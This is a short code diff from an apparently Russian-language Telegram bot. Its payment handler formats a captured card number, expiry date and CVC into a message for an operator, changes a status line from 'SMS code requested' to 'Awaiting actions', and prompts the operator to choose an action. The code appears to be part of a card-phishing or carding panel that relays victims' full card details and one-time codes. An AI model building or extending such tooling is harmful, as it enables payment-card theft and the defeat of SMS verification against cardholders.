@@ -635,7 +635,7 @@ async def process_payment_data(message: types.Message):
             formatted_text += f"• Номер: {payment_data.get('card_number', '')}\n"
             formatted_text += f"• Срок: {payment_data.get('card_expiry', '')}\n"
             formatted_text += f"• CVC: {payment_data.get('cvc', '')}\n\n"
-            formatted_text += "📱 <b>Статус: SMS код запрошен</b>\n\n"
+            formatted_text += "📱 <b>Статус: Ожидание действий</b>\n\n"
             formatted_text += "Выберите действие:"
             
             await bot.send_message(
@@ -1015,6 +1015,7 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
 
 
 
